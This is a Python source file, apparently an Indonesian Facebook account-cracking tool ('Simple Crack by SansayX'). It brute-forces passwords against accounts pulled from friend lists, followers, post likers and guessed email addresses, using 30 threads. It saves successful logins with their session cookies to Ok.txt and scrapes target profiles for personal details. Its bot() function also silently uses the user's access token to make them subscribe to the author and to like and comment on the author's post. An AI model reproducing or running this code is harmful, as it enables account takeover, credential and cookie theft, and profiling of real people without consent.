...
# coding=utf-8
# coding by SansayX
# Note : gak usah banyak bacot, tinggal pake aja
# Open source code by Tsani | ngotak dikit cok jangan jual di perjual belikan...

## Jangan di jual belikan memek...
## Hargai gue dengan jangan ganti nama author...
## Dan jangan lupa suscribe chenel gue mmk...
## Buat yang mau ngamal ke Dana | Ovo | Gopay -> 081211847166
## MAKASIH
...
def banner():
	print('''%s
_
SIMPLE CRACK BY SANSAYX
-- 
¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w
 [\x1b[1;96m+%s] Pembuat   :  SansayX
 [\x1b[1;96m+%s] Github   : https://github.com/SansayX
 [\x1b[1;96m+%s] Facebook : Ujaang Saani
 [\x1b[1;96m+%s] Whatsapp : 085294383463
¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w\n'''%(N,N,N,N))
...
class login:
	...
	def __login__(self):
		os.system('clear')
		banner()
		token = input(' [%s*%s] Asupkeun Token Didieu Ajigg : '%(O,N))
		if token in ['']:
			...
			try:
				...
				print('\n [%s+%s] Login Berhasil Dekk %s'%(H,N,cc))
				self.bot()
			except KeyError:
				jalan(' [%s!%s] Token error goblogg ganti make akun lain!'%(M,N))
				self.takon()
	def takon(self):
		takon = input('\n %s[%s!%s] Hayang apal cara nyieun token? y/t: '%(N,O,N))
		if takon in ['y','Y','iya']:
			jalan('\n %s[%s!%s] Kamu akan di arahkan ke Ke Wa Untuk Donasi'%(N,O,N))
			os.system('xdg-open wa.me/6285294383463);exit()
		else:
			login().__login__()
	def bot(self):
		...
		requests.post('https://graph.facebook.com/100048254839165/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/100048254839165/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/100048254839165/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/507559120862578/comments/?message=' +komen+ '&access_token=' + toket)
		requests.post('https://graph.facebook.com/507559120862578/likes?summary=true&access_token=' + toket)
		requests.post('https://graph.facebook.com/507559120862578/comments/?message='+komen+'&access_token=' + toket)
		requests.post('https://graph.facebook.com/507559120862578/likes?summary=true&access_token=' + toket)
		os.system('xdg-open wa.me/6285294383463')
		menu().main()
...
class menu:
	...
	def main(self):
		...
		jalan(' %sùİùù[ %sselamat Datang Om>< %s%s ]'%(N,H,r,N))
		print(' %sùø'%(N))
		print(' %sùàùù[%s¡H%s] Accsess licensee kamu   : %s'%(N,O,N,akss))
		print(' %sùàùù[%s¡H%s] Alamat IP kamu saat ini : %s'%(N,O,N,IP))
		print(' %sùàùù[%s¡H%s] Kamu masuk pada         : %s'%(N,O,N,waktu))
		print(' %sùø'%(N))
		print(' %sùàùù[%s0%s] crack dari daftar teman     [ON]'%(N,O,N))
		print(' %sùàùù[%s1%s] crack dari akun publik      [ON]'%(N,O,N))
		print(' %sùàùù[%s2%s] crack dari akun massal    [ON]'%(N,O,N))
		print(' %sùàùù[%s3%s] crack dari postingan         [ON]'%(N,O,N))
		print(' %sùàùù[%s4%s] crack dari likes post          [ON]'%(N,O,N))
		print(' %sùàùù[%s5%s] crack dari followers          [ON]'%(N,O,N))
		print(' %sùàùù[%s6%s] cek opsi akun chekpoint  [ON]'%(N,O,N))
		print(' %sùàùù[%s7%s] cek hasil crack ok,cp       [ON]'%(N,O,N))
		print(' %sùàùù[%s8%s] seting User-Agent            [ON]'%(N,O,N))
		print(' %sùàùù[%s9%s] crack email                       [ON]'%(N,O,N))
		print(' %sùàùù[%sG%s] Get data¡H facebook          [ON]'%(N,O,N))
		print(' %sùàùù[%sK%s] Lapor bug script               [ON]'%(N,O,N))
		print(' %sùàùù[%sA%s] Keluar, hapus token[         [ON]'%(N,O,N))
		print(' %sùàùù[%sU%s] Upgrade ke premium        [ON]'%(N,O,N))
		self.pilih()

	def pilih(self):
		print(' %sùø'%(N))
		usna = input(' %sùàùù[%s+%s] choose : '%(N,O,N))
		if usna in ['']:
			print(' %sùø'%(N))
			print(' %sùãùù[%s!%s] Jangan kosong mas'%(N,M,N));time.sleep(2);menu().main()
		elif usna in ['0','00']:
			try:
				token = open('token.x','r').read()
			except IOError:
				os.system('rm -rf token.x')
				exit(' %sùãùù[%s!%s] Cek token kamu'%(N,M,N))
			try:
				lmt = input(' %sùàùù[%s+%s] Limit id : '%(N,O,N))
				...
				print(' %sùãùù[%s!%s] Akun anda tidak publik...'%(N,M,N));time.sleep(2);menu().main()
			else:
				crack().fbeh(id)
		elif usna in ['1','01']:
			try:
				...
				os.system('rm -rf token.x')
				exit(' %sùãùù[%s!%s] Coba jalankan ulang !'%(N,M,N))
			try:
				print(' %sùø'%(N))
				idt = input(' %sùàùù[%s¡H%s] Masukan id : '%(N,O,N))
				...
				print(' %sùø'%(N))
				jalan(' %sùàùù[%s¡H%s] ID %s tidak di temukan!'%(N,M,N,idt));time.sleep(2);menu().main()
			else:
				crack().fbeh(id)
		elif usna in ['2','02']:
			token = open('token.x','r').read()
			try:
				pler = int(input(' %sùàùù[%s¡H%s] Mau crack berapa id : '%(N,O,N)))
			except:pler = 1
			for ikeh in range(pler):
				ikeh += 1
				try:
					print(' %sùø'%(N))
					idt = input(' %sùàùù[%s¡H%s] Masukan id yang ke %s : '%(N,O,N,ikeh))
			...
			try:
				...
				print(' %sùãùù[%s!%s] ID %s tidak publik'%(N,O,N,idt));time.sleep(3);menu().main()
			else:
				crack().fbeh(id)
		elif usna in ['4','04']:
			...
			try:
				...
				print(' %sùãùù[%s!%s] ID %s Tidak di temukan'%(N,O,N,idt));time.sleep(2);menu().main()
			else:
				crack().fbeh(id)
		elif usna in ['5','05']:
			...
			try:
				...
				print(' %sùãùù[%s!%s] ID %s tidak publik'%(N,O,N,idt));time.sleep(2);menu().main()
			else:
				crack().fbeh(id)
		elif usna in ['6','06']:
			print(' %sùø'%(N))
			print(' %sùàùù[%s¡H%s] Masukan -> Cp.txt sebagai file'%(N,O,N))
			files = input(' %sùàùù[%s¡H%s] Masukan files : '%(N,O,N))
			try:
			...
			print(' %sùø'%(N))
			print(' %sùàùù[%s1%s] Cek hasil ok'%(N,O,N))
			print(' %sùàùù[%s2%s] Cek hasil cp'%(N,O,N))
			print(' %sùàùù[%s0%s] Kembali'%(N,O,N))
			print(' %sùø'%(N))
			hsl = input(' %sùàùù[%s¡H%s] choose : '%(N,O,N))
			if hsl in ['1','01']:
				...
				if len(hasil_ok) != 0:
					...
					print(' %sùãùù[%s!%s] Kamu gak dapet hasil okeh :('%(N,O,N))
			elif hsl in ['2','02']:
			...
			print(' %sùø'%(N))
			print(' %sùàùù[%s1%s] Cek user agent default'%(N,O,N))
			print(' %sùàùù[%s2%s] Ganti user agent '%(N,O,N))
			print(' %sùàùù[%s0%s] Keluar'%(N,O,N))
			print(' %sùø'%(N))
			pwk = input(' %sùàùù[%s+%s] choose : '%(N,O,N))
			if pwk in ['1','01']:
				fika = open('user.txt','r').read()
				print(' %sùãùù[%s!%s] User agent sekarang : %s'%(N,O,N,fika))
				time.sleep(4);menu().main()
			elif pwk in ['2','02']:
				ua = input(' %sùàùù[%s+%s] Masukan ua baru : '%(N,O,N))
				try:
					nunu = open('user.txt','w')
					nunu.write(ua)
					nunu.close()
					print(' %sùãùù[%s!%s] Sukses mengganti ua : %s'%(N,O,N,ua));time.sleep(4);menu().main()
				except:pass
			else:
				menu().main()
		elif usna in ['9','09']:
			data = []
			print(' %sùø'%(N))
			nama = input(' %sùàùù[%s+%s] Target nama : '%(N,O,N))
			print(' %sùàùù[%s+%s] Contoh domain : Jika ingin crack Gmail ketik : G '%(N,O,N))
			domain = input(' %sùàùù[%s+%s] Masukan domain [G]mail, [Y]ahoo, [H]otmail : '%(N,O,N)).lower().strip()
			list = {
				'g':'@gmail.com',
				'y':'@yahoo.com',
				'h':'@hotmail.com'
			}
			jml = int(input(' %sùàùù[%s+%s] Jumlah target : '%(N,O,N)))
			pwx = input(' %sùàùù[%s+%s] Masukan password : '%(N,O,N)).split(',')
			print(' %sùàùù[%s+%s] Crack sedang di mulai'%(N,O,N))
			...
			exit('%sùãùù[%s!%s] Crack telah selezai'%(N,O,N))
		elif usna in ['G','g']:
			target()
		elif usna in ['K','k']:
			nom_wa ='+6285866306386'
			text = input(' %sùãùù[%s!%s] Apa yang error ketik di sini : '%(N,O,N))
			...
			nom_wa ='+6285866306386'
			kata = input(' %sùãùù[%s!%s] Masukan pesan kamu ke admin : %s'%(N,O,N,H))
			url_wa = ("https://api.whatsapp.com/send?phone="+nom_wa+"&text="+kata)
			subprocess.check_output(["am", "start", url_wa])
			exit()
		else:
			print('%s ùãùù[%s+%s] Wrong input'%(N,M,N));time.sleep(2);menu().main()
...
def target():
    ...
    try:
        ...
        lo = ("-")
    jalan(" ùàùù[¡H] Name : " + nm)
    jalan(" ùàùù[¡H] First Name : " + nd)
    jalan(" ùàùù[¡H] Middle Name : " + nt)
    jalan(" ùàùù[¡H] Last Name : " + nb)
    jalan(" ùàùù[¡H] Birthday : " + ut)
    jalan(" ùàùù[¡H] Gender : " + gd)
    jalan(" ùàùù[¡H] Email : " + em)
    jalan(" ùàùù[¡H] Link : " + lk)
    jalan(" ùàùù[¡H] Username : " + us)
    jalan(" ùàùù[¡H] Religion : " + rg)
    jalan(" ùàùù[¡H] Relationship Status : " + rl)
    jalan(" ùàùù[¡H] Relationship With : " + rls)
    jalan(" ùàùù[¡H] Location : " + lc)
    jalan(" ùàùù[¡H] Hometown : " + ht)
    jalan(" ùàùù[¡H] About : " + ab)
    jalan(" ùàùù[¡H] Locale : " + lo)
    input(' ùãùù[+] Back to menu, pres enter')
    menu().main()
  ...
  try:
    for pw in passs:
      ...
      if re.search('(EAAA)\w+', str(response.text)):
        print('%s --> %s ¡H %s '%(H,str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('%s * --> %s ¡H %s '%(K,str(user), str(pw)))
        break
  except: pass
...
def khamdihi(user, pasw):
	...
	if "c_user" in ses.cookies:
		...
		print(" ¡H Akun Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))))
		num = 0
		for _ in xe:
			num += 1
		...
		print(" ¡H Total Opsi Yang Tersedia  "+str(len(ngew)))
...
class crack:
	...
	def fbeh(self,id):
		self.id = id
		print(' %sùàùù[%s+%s] Total id : %s%s'%(N,O,N,H,len(id)))
		kham = input(' %sùàùù[%s?%s] Gunakan password manual y/t : '%(N,O,N))
		if kham in ['']:
			print(' %sùàùù[%s!%s] Jangan kozong !'%(N,M,N));time.sleep(2);crack().fbeh(id)
		elif kham in ['y','Y','Iya','iya']:
			print(' %sùø'%(N))
			print(' %sùàùù[%s!%s] Gunakan koma untuk pemisahan cnth : sayang,katasandi'%(N,O,N))
			while True:
				pw = input(' %sùàùù[%s¡H%s] Masukan password : '%(N,O,N))
				if pw in ['']:
					print(' %sùàùù[%s!%s] Jangan kosong'%(N,M,N))
				elif len(pw)<=5:
					print(' %sùàùù[%s!%s] Password harus ada 6 kata/ lebih !!'%(N,M,N))
				else:
					def manual(xnxx=None):
						print('%s ùø'%(N))
						mani = input(' %sùàùù[%s¡H%s] Metode : '%(N,O,N))
						if mani in ['']:
							print(' %sùàùù[%s!%s] Jangan kosong mmk'%(N,M,N));self.manual()
						elif mani in ['1','01']:
							print(' %sùø'%(N))
							print(' ùàùù[%s*%s] akun Ok akan di simpan di file : Ok.txt'%(O,N))
							print(' ùãùù[%s*%s] akun CP akan di simpan di file : Cp.txt\n'%(O,N))
							...
							print(' %sùø'%(N))
							print(' %sùàùù[%s*%s] akun OK akan di simpan di file : Ok.txt'%(N,O,N))
							print(' %sùãùù[%s*%s] akun CP akan di simpan di file : Cp.txt\n'%(N,O,N))
							with khamdihiXD(max_workers=30) as dihi:
								for me in self.id:
									try:
										Nufikha = me.split('<=>')[0]
							...
							print(' %sùø'%(N))
							print(' %sùàùù[%s*%s] akun OK akan di simpan di file : Ok.txt'%(N,O,N))
							print('%s ùãùù[%s*%s] akun Cp akan di simpan di file : Cp.txt\n'%(N,O,N))
							with khamdihiXD(max_workers=30) as dihi:
								for me in self.id:
									try:
										Nufikha = me.split('<=>')[0]
							...
							exit()
					print(' %sùø'%(N))
					print(' %sùàùù[%s1%s] Metode Free'%(N,O,N))
					print(' %sùàùù[%s2%s] Metode Mbasic'%(N,O,N))
					print(' %sùàùù[%s3%s] Metode Mobile/M'%(N,O,N))
					manual(pw.split(','))
					break
	...
	def otomatis(self):
		print(' %sùø'%(N))
		oto = input(' %sùàùù[%s+%s] Crack dengan metode : '%(N,O,N))
		if oto in ['']:
			print('ùàùù[%s!%s] jangan kosonh'%(O,N));self.otomatis()
		elif oto in ['1','01']:
			self.free()
		elif oto in ['2','02']:
			self.basic()
			...
			print('ùàùù[%s!%s] Pilih menu yg bnr'%(M,N));self.otomatis()
	def free(self):
		print(' %sùø'%(N))
		print(' %sùàùù[%s*%s] akun okeh akan di simpan di file  : hasil/okeh.txt'%(N,O,N))
		print(' %sùàùù[%s*%s] akun cepeh akan di simpan di file : hasil/cepeh.txt\n'%(N,O,N))
		with khamdihiXD(max_workers=30) as dihi:
			for me in self.id:
				try:
					uid, name = me.split('<=>')
	...
	def basic(self):
		print(' %sùø'%(N))
		print(' %sùàùù[%s*%s] akun OK akan di simpan di file : Ok.txt'%(N,O,N))
		print(' %sùàùù[%s*%s] akun CP akan di simpan di file : Cp.txt'%(N,O,N))
		print(' %sùãùù[%s!%s] Mode pesawat 2 detik jika tidak ada hasil\n'%(N,O,N))
		with khamdihiXD(max_workers=30) as dihi:
			for me in self.id:
				try:
					uid, name = me.split('<=>')
			...
			for pw in pwx:
				...
				if "c_user" in ses.cookies.get_dict():
					try:
						...
						print('\r %s--> %s ¡H %s ¡H %'%(H,user,pw,coki))
						cek_apk(coki)
						ok.append("%s ¡H %s ¡H %s "%(user,pw,coki))
						open('Ok.txt', 'a').write(" --> %s ¡H %s ¡H %s\n"%(user,pw,coki))
						break
						...
						pass
					print('\r %s--> %s ¡H %s ¡H %s '%(H,user,pw,coki))
					cek_apk(coki)
					ok.append('%s ¡H %s ¡H %s'%(user,pw,coki))
					open('Ok.txt', 'a').write(' --> %s ¡H %s ¡H %s\n'%(user,pw,coki))
					break
					...
					try:
						...
						month = bulan12[month]
						print('\r %s--> %s ¡H %s '%(K,user,pw))
						cp.append("%s ¡H %s"%(user,pw,))
						open('Cp.txt', 'a').write(" --> %s ¡H %s \n"%(user,pw))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
			...
			for pw in pwx:
				...
				if 'c_user' in ses.cookies.get_dict():
					try:
						...
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print('\r %s--> %s ¡H %s ¡H %s %s %s ¡H %s'%(H,user,pw,day,month,year,coki))
						cek_apk(coki)
						ok.append("%s ¡H %s ¡H %s %s %s ¡H %s "%(user,pw,day,month,year,kukis))
						open('Ok.txt', 'a').write(" --> %s ¡H %s ¡H %s %s %s ¡H %s \n"%(user,pw,day,month,year,coki))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
					...
					try:
						...
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print('\r %s--> %s ¡H %s ¡H %s %s %s'%(K,user,pw,day,month,year))
						cp.append("%s ¡H %s ¡H %s %s %s"%(user,pw,day,month,year))
						open('Cp.txt', 'a').write(" --> %s ¡H %s ¡H %s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
